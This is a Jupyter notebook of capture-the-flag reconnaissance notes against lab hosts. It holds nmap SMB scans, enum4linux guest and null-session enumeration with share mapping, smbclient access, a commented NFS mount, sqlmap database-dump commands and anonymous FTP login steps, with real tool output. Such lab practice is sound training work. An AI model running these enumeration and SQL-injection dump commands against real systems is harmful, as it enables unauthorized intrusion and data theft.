{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "62095b45-eb51-4cfd-8f65-71ec3e575db9",
   "metadata": {},
   "source": [
    "# Service Enumeration:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "c46c7063-380b-4802-84fe-c65b0f6c47a6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TARGET=10.10.207.10\n"
     ]
    }
   ],
   "source": [
    "%env TARGET=10.10.207.10"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0d326b74-d767-4baa-9ebe-57984c5ca3df",
   "metadata": {
    "tags": []
   },
   "source": [
    "# SMB:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "3e707234-9bfd-441d-a6f6-7c58a11c0663",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-30 00:56 UTC\n",
      "NSE: Loaded 46 scripts for scanning.\n",
      "NSE: Script Pre-scanning.\n",
      "Initiating NSE at 00:56\n",
      "Completed NSE at 00:56, 0.00s elapsed\n",
      "Initiating NSE at 00:56\n",
      "Completed NSE at 00:56, 0.00s elapsed\n",
      "Initiating ARP Ping Scan at 00:56\n",
      "Scanning 10.10.207.10 [1 port]\n",
      "Completed ARP Ping Scan at 00:56, 0.03s elapsed (1 total hosts)\n",
      "Initiating Parallel DNS resolution of 1 host. at 00:56\n",
      "Completed Parallel DNS resolution of 1 host. at 00:56, 0.00s elapsed\n",
      "Initiating SYN Stealth Scan at 00:56\n",
      "Scanning ip-10-10-207-10.eu-west-1.compute.internal (10.10.207.10) [3 ports]\n",
      "Discovered open port 139/tcp on 10.10.207.10\n",
      "Discovered open port 445/tcp on 10.10.207.10\n",
      "Completed SYN Stealth Scan at 00:56, 0.03s elapsed (3 total ports)\n",
      "Initiating Service scan at 00:56\n",
      "Scanning 2 services on ip-10-10-207-10.eu-west-1.compute.internal (10.10.207.10)\n",
      "Completed Service scan at 00:56, 6.01s elapsed (2 services on 1 host)\n",
      "NSE: Script scanning 10.10.207.10.\n",
      "Initiating NSE at 00:56\n",
      "Completed NSE at 00:56, 0.00s elapsed\n",
      "Initiating NSE at 00:56\n",
      "Completed NSE at 00:56, 0.00s elapsed\n",
      "Nmap scan report for ip-10-10-207-10.eu-west-1.compute.internal (10.10.207.10)\n",
      "Host is up (0.00027s latency).\n",
      "Not shown: 1 closed port\n",
      "PORT    STATE SERVICE      VERSION\n",
      "139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n",
      "445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n",
      "MAC Address: 02:D2:98:C7:60:E7 (Unknown)\n",
      "Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows\n",
      "\n",
      "NSE: Script Post-scanning.\n",
      "Initiating NSE at 00:56\n",
      "Completed NSE at 00:56, 0.00s elapsed\n",
      "Initiating NSE at 00:56\n",
      "Completed NSE at 00:56, 0.00s elapsed\n",
      "Read data files from: /usr/bin/../share/nmap\n",
      "Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n",
      "Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds\n",
      "           Raw packets sent: 4 (160B) | Rcvd: 4 (156B)\n"
     ]
    }
   ],
   "source": [
    "!nmap -v -sV --open -Pn  -p 137,139,445 --script=smb-ls $TARGET"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "271f01bd-59db-4b97-adc8-ae825cc59ab5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-30 00:49 UTC\n",
      "NSE: Loaded 49 scripts for scanning.\n",
      "NSE: Script Pre-scanning.\n",
      "Initiating NSE at 00:49\n",
      "Completed NSE at 00:49, 0.00s elapsed\n",
      "Initiating NSE at 00:49\n",
      "Completed NSE at 00:49, 0.00s elapsed\n",
      "Initiating ARP Ping Scan at 00:49\n",
      "Scanning 10.10.207.10 [1 port]\n",
      "Completed ARP Ping Scan at 00:49, 0.04s elapsed (1 total hosts)\n",
      "Initiating Parallel DNS resolution of 1 host. at 00:49\n",
      "Completed Parallel DNS resolution of 1 host. at 00:49, 0.00s elapsed\n",
      "Initiating SYN Stealth Scan at 00:49\n",
      "Scanning ip-10-10-207-10.eu-west-1.compute.internal (10.10.207.10) [3 ports]\n",
      "Discovered open port 445/tcp on 10.10.207.10\n",
      "Discovered open port 139/tcp on 10.10.207.10\n",
      "Completed SYN Stealth Scan at 00:49, 0.05s elapsed (3 total ports)\n",
      "Initiating Service scan at 00:49\n",
      "Scanning 2 services on ip-10-10-207-10.eu-west-1.compute.internal (10.10.207.10)\n",
      "Completed Service scan at 00:49, 6.01s elapsed (2 services on 1 host)\n",
      "NSE: Script scanning 10.10.207.10.\n",
      "Initiating NSE at 00:49\n",
      "Completed NSE at 00:49, 0.07s elapsed\n",
      "Initiating NSE at 00:49\n",
      "nmap: nse_nsock.cc:369: void callback(nsock_pool, nsock_event, void*): Assertion `lua_status(L) == LUA_YIELD' failed.\n"
     ]
    }
   ],
   "source": [
    "!nmap -v -sV --open -Pn  -p 137,139,445 --script=smb-os-discovery,smb-enum-shares,smb-security-mode $TARGET --script-args=smbbasic=1,smbsign=ignore | tee smb_results.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "8ce94cf9-8d82-4161-9b3f-7ffba4712207",
   "metadata": {},
   "outputs": [
    {
     "ename": "IndexError",
     "evalue": "list index out of range",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mIndexError\u001b[0m                                Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_3976/329774868.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0mresult\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgetoutput\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'cat smb_results.txt | grep account_used'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 5\u001b[0;31m \u001b[0manon_user\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mresult\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msplit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m':'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m-\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstrip\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      6\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      7\u001b[0m \u001b[0manon_user\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mIndexError\u001b[0m: list index out of range"
     ]
    }
   ],
   "source": [
    "import os\n",
    "\n",
    "try:\n",
    "    result = !cat smb_results.txt | grep account_used\n",
    "\n",
    "    anon_user = result[0].split(':')[-1].strip()\n",
    "except:\n",
    "    anon_user = \"guest\"\n",
    "\n",
    "anon_user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "beb8729d-1cbe-4971-a6f3-c58847a7e312",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Sep 30 00:51:33 2021\n",
      "\n",
      "\u001b[34m =========================================( \u001b[0m\u001b[32mTarget Information\u001b[0m\u001b[34m )=========================================\n",
      "\n",
      "\u001b[0mTarget ........... 10.10.207.10\n",
      "RID Range ........ 500-550,1000-1050\n",
      "Username ......... 'guest'\n",
      "Password ......... ''\n",
      "Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n",
      "\n",
      "\n",
      "\u001b[34m ============================( \u001b[0m\u001b[32mEnumerating Workgroup/Domain on 10.10.207.10\u001b[0m\u001b[34m )============================\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32mGot domain/workgroup name: WORKGROUP\n",
      "\n",
      "\u001b[0m\n",
      "\u001b[34m ================================( \u001b[0m\u001b[32mNbtstat Information for 10.10.207.10\u001b[0m\u001b[34m )================================\n",
      "\n",
      "\u001b[0mLooking up status of 10.10.207.10\n",
      "\tGATEKEEPER      <00> -         B <ACTIVE>  Workstation Service\n",
      "\tWORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name\n",
      "\tGATEKEEPER      <20> -         B <ACTIVE>  File Server Service\n",
      "\tWORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections\n",
      "\tWORKGROUP       <1d> -         B <ACTIVE>  Master Browser\n",
      "\t..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser\n",
      "\n",
      "\tMAC Address = 02-D2-98-C7-60-E7\n",
      "\n",
      "\u001b[34m ===================================( \u001b[0m\u001b[32mSession Check on 10.10.207.10\u001b[0m\u001b[34m )===================================\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32mServer 10.10.207.10 allows sessions using username 'guest', password ''\n",
      "\n",
      "\u001b[0m\n",
      "\u001b[34m ================================( \u001b[0m\u001b[32mGetting domain SID for 10.10.207.10\u001b[0m\u001b[34m )================================\n",
      "\n",
      "\u001b[0mCannot connect to server.  Error was NT_STATUS_LOGON_FAILURE\n",
      "\u001b[33m\n",
      "[+] \u001b[0m\u001b[32mCan't determine if host is part of domain or part of a workgroup\n",
      "\n",
      "\u001b[0m\n",
      "\u001b[34m ===================================( \u001b[0m\u001b[32mOS information on 10.10.207.10\u001b[0m\u001b[34m )===================================\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[E] \u001b[0m\u001b[31mCan't get OS info with smbclient\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32mGot OS info for 10.10.207.10 from srvinfo: \n",
      "\u001b[0mCannot connect to server.  Error was NT_STATUS_LOGON_FAILURE\n",
      "\n",
      "\n",
      "\u001b[34m =======================================( \u001b[0m\u001b[32mUsers on 10.10.207.10\u001b[0m\u001b[34m )=======================================\n",
      "\n",
      "\u001b[0mUse of uninitialized value $users in print at ./enum4linux.pl line 972.\n",
      "Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.\n",
      "\n",
      "Use of uninitialized value $users in print at ./enum4linux.pl line 986.\n",
      "Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.\n",
      "\n",
      "\u001b[34m =================================( \u001b[0m\u001b[32mShare Enumeration on 10.10.207.10\u001b[0m\u001b[34m )=================================\n",
      "\n",
      "\u001b[0m\n",
      "\tSharename       Type      Comment\n",
      "\t---------       ----      -------\n",
      "\tADMIN$          Disk      Remote Admin\n",
      "\tC$              Disk      Default share\n",
      "\tIPC$            IPC       Remote IPC\n",
      "\tUsers           Disk      \n",
      "SMB1 disabled -- no workgroup available\n",
      "\u001b[33m\n",
      "[+] \u001b[0m\u001b[32mAttempting to map shares on 10.10.207.10\n",
      "\n",
      "\u001b[0m//10.10.207.10/ADMIN$\t\u001b[35mMapping: \u001b[0mDENIED\u001b[35m Listing: \u001b[0mN/A\u001b[35m Writing: \u001b[0mN/A\n",
      "//10.10.207.10/C$\t\u001b[35mMapping: \u001b[0mDENIED\u001b[35m Listing: \u001b[0mN/A\u001b[35m Writing: \u001b[0mN/A\n",
      "\u001b[33m\n",
      "[E] \u001b[0m\u001b[31mCan't understand response:\n",
      "\n",
      "\u001b[0mNT_STATUS_INVALID_PARAMETER listing \\*\n",
      "//10.10.207.10/IPC$\t\u001b[35mMapping: \u001b[0mN/A\u001b[35m Listing: \u001b[0mN/A\u001b[35m Writing: \u001b[0mN/A\n",
      "//10.10.207.10/Users\t\u001b[35mMapping: \u001b[0mOK\u001b[35m Listing: \u001b[0mOK\u001b[35m Writing: \u001b[0mN/A\n",
      "\n",
      "\u001b[34m ============================( \u001b[0m\u001b[32mPassword Policy Information for 10.10.207.10\u001b[0m\u001b[34m )============================\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[E] \u001b[0m\u001b[31mUnexpected error from polenum:\n",
      "\n",
      "\u001b[0m\n",
      "\n",
      "[+] Attaching to 10.10.207.10 using guest\n",
      "\n",
      "[+] Trying protocol 139/SMB...\n",
      "\n",
      "\t[!] Protocol failed: Cannot request session (Called Name:10.10.207.10)\n",
      "\n",
      "[+] Trying protocol 445/SMB...\n",
      "\n",
      "\t[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.\n",
      "\n",
      "\n",
      "\u001b[33m\n",
      "[+] \u001b[0m\u001b[32mRetieved partial password policy with rpcclient:\n",
      "\n",
      "\n",
      "\u001b[0m\n",
      "\n",
      "\u001b[34m =======================================( \u001b[0m\u001b[32mGroups on 10.10.207.10\u001b[0m\u001b[34m )=======================================\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32mGetting builtin groups:\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32m Getting builtin group memberships:\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32m Getting local groups:\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32m Getting local group memberships:\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32m Getting domain groups:\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32m Getting domain group memberships:\n",
      "\n",
      "\u001b[0m\n",
      "\u001b[34m ==================( \u001b[0m\u001b[32mUsers on 10.10.207.10 via RID cycling (RIDS: 500-550,1000-1050)\u001b[0m\u001b[34m )==================\n",
      "\n",
      "\u001b[0m\n",
      "\u001b[34m ===============================( \u001b[0m\u001b[32mGetting printer info for 10.10.207.10\u001b[0m\u001b[34m )===============================\n",
      "\n",
      "\u001b[0mCannot connect to server.  Error was NT_STATUS_LOGON_FAILURE\n",
      "\n",
      "\n",
      "enum4linux complete on Thu Sep 30 00:51:35 2021\n",
      "\n"
     ]
    }
   ],
   "source": [
    "!./enum4linux.pl -a -u {anon_user} {os.environ['TARGET']}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "495cc72a-75b3-4d6b-8d4f-dd957ad3c56c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Sep 30 00:49:15 2021\n",
      "\n",
      "\u001b[34m =========================================( \u001b[0m\u001b[32mTarget Information\u001b[0m\u001b[34m )=========================================\n",
      "\n",
      "\u001b[0mTarget ........... 10.10.207.10\n",
      "RID Range ........ 500-550,1000-1050\n",
      "Username ......... ''\n",
      "Password ......... ''\n",
      "Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n",
      "\n",
      "\n",
      "\u001b[34m ============================( \u001b[0m\u001b[32mEnumerating Workgroup/Domain on 10.10.207.10\u001b[0m\u001b[34m )============================\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32mGot domain/workgroup name: WORKGROUP\n",
      "\n",
      "\u001b[0m\n",
      "\u001b[34m ===================================( \u001b[0m\u001b[32mSession Check on 10.10.207.10\u001b[0m\u001b[34m )===================================\n",
      "\n",
      "\u001b[0m\u001b[33m\n",
      "[+] \u001b[0m\u001b[32mServer 10.10.207.10 allows sessions using username '', password ''\n",
      "\n",
      "\u001b[0m\n",
      "\u001b[34m ================================( \u001b[0m\u001b[32mGetting domain SID for 10.10.207.10\u001b[0m\u001b[34m )================================\n",
      "\n",
      "\u001b[0mCould not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED\n",
      "\u001b[33m\n",
      "[+] \u001b[0m\u001b[32mCan't determine if host is part of domain or part of a workgroup\n",
      "\n",
      "\u001b[0menum4linux complete on Thu Sep 30 00:49:17 2021\n",
      "\n"
     ]
    }
   ],
   "source": [
    "!./enum4linux.pl -A $TARGET"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "ff8b062b-0e5d-40fb-a6a8-18576165a8ba",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: SHARE=Users\n"
     ]
    }
   ],
   "source": [
    "%env SHARE=Users"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "7731ed9e-b27b-49ce-9a9c-24d14e60f3d6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Run this:\n",
      "cd '/root/ctf-notebooks'\n",
      "smbclient //10.10.207.10/Users -U guest\n"
     ]
    }
   ],
   "source": [
    "!echo Run this:\n",
    "!echo cd \\'$(pwd)\\'\n",
    "!echo smbclient //$TARGET/$SHARE -U guest"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "59613e52-7f58-429e-932c-b43edc35d829",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "        <iframe\n",
       "            width=\"1200\"\n",
       "            height=\"500\"\n",
       "            src=\"http://192.168.1.21:8888/lab/tree/7_THM_CTF\"\n",
       "            frameborder=\"0\"\n",
       "            allowfullscreen\n",
       "        ></iframe>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.lib.display.IFrame at 0x7f13346b81c0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from web_footprinting_utils import show_term\n",
    "\n",
    "show_term()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "327a1317-eaa4-45e2-b771-152a7ddd740d",
   "metadata": {},
   "source": [
    "#### Use ls, get, cd to pull down any needed files in SMB..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "325c30c0-5b52-4aba-bd80-9e3390b94736",
   "metadata": {},
   "outputs": [],
   "source": [
    "!ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1c3a562d-a81b-4e1f-a5f4-962257726baa",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "!cat log.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b0ecc06b-a7c4-4bf8-abe7-425a4b38defa",
   "metadata": {
    "jp-MarkdownHeadingCollapsed": true,
    "tags": []
   },
   "source": [
    "# NFS Anonymous Mounting:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0492f285-b455-4edd-b3eb-1aadb42387ff",
   "metadata": {},
   "outputs": [],
   "source": [
    "from getpass import getpass\n",
    "import os\n",
    "\n",
    "%env RDIR = /var"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "73745c96-001a-4ad3-9fb8-9288ba2bdc09",
   "metadata": {},
   "outputs": [],
   "source": [
    "# !mkdir -p my_mount\n",
    "# !echo { getpass() } | sudo -S sudo mount {os.environ['TARGET']}:{os.environ['RDIR']} my_mount\n",
    "# !ls -la my_mount"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f115675d-e198-4d00-a50b-48e09f525ba0",
   "metadata": {
    "tags": []
   },
   "source": [
    "# SQL Map:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c7df2415-8125-4f69-beba-462d0efbf3fb",
   "metadata": {},
   "outputs": [],
   "source": [
    "!sqlmap -r bugle_user.txt --dbms=mariadb --dump --batch"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30839a99-5f75-4813-8fea-9f4d6dea2eff",
   "metadata": {},
   "outputs": [],
   "source": [
    "!sqlmap -r bugle_admin.txt --dbms=mariadb --dump --batch"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7adb8392-3cb5-4535-bcef-416d04fcd97c",
   "metadata": {},
   "outputs": [],
   "source": [
    "!sqlmap -r bugle_admin.txt --dbms=mariadb --dump --batch --level=5"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e2e5b3a6-ae0d-4d7c-a2dd-afbc3eeb489b",
   "metadata": {},
   "source": [
    "# FTP:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0f7b1b1c-296c-4039-9542-7f784236cb98",
   "metadata": {},
   "source": [
    "ftp 10.10.28.39\n",
    "\n",
    "anonymous\n",
    "\n",
    "no password"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1e283a13-9fec-48af-b58c-8d1aed40b4ad",
   "metadata": {},
   "source": [
    "#### remember to enable binary mode to download binaries:\n",
    "\n",
    "binary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f8383462-e93d-4a36-9073-e11377cf5959",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
